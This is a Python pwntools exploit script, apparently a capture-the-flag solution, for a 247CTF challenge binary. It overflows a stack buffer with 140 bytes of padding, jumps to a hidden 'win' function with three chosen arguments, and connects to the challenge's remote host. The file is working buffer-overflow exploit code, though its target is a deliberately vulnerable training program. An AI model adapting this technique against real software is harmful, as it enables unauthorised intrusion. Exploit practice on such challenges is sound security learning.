#!/usr/bin/env python3

# Exploit by x90slide

from pwn import *

elf = ELF("./hidden_flag_function_with_args_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("5a2edd68ee84e2fa.247ctf.com", 50387)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    winfun = 0x08048576
    param_1 = 0x1337
    param_2 = 0x247
    param_3 = 0x12345678
    payload = flat(b'A'*140, winfun, b'A'*4, param_1, param_2, param_3)
    io.sendlineafter(b':', payload)

    io.interactive()

if __name__ == "__main__":
    main()
